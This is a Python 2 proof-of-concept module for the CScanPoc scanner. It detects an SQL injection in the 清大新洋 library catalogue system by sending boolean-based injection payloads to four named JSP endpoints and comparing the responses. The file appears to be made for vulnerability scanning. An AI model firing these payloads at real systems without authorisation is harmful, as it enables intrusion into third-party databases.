# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'infosea_0002' # 平台漏洞编号，留空
    name = '清大新洋图书检索系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
        清大新洋图书系统 
        /opac/hot.jsp
        /opac/index_hotll.jsp
        /opac/fljs/fllist.jsp
        /opac/ckgc.jsp
        参数过滤不完整，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '清大新洋图书检索系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ca9bd0da-7072-407c-bbd4-8a1339e3d73e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-085319
            #refer:http://www.wooyun.org/bugs/wooyun-2010-082667
            #refer:http://www.wooyun.org/bugs/wooyun-2010-079840
            #refer:http://www.wooyun.org/bugs/wooyun-2010-014662
            hh = hackhttp.hackhttp()
            payloads = [
                '/opac/hot.jsp?flh=',
                '/opac/index_hotll.jsp?flh=',
                '/opac/fljs/fllist.jsp?flh=',
                '/opac/ckgc.jsp?kzh=',
            ]
            getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
            getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
            for payload in payloads:
                url1 = self.target + payload + getdata1
                url2 = self.target + payload + getdata2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)  
                m1 = re.findall('href', res1)
                m2 = re.findall('href', res2)

                if code1 == 200 and code2 ==200 and m1!=m2:
                    #security_hole(arg+payload+'   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
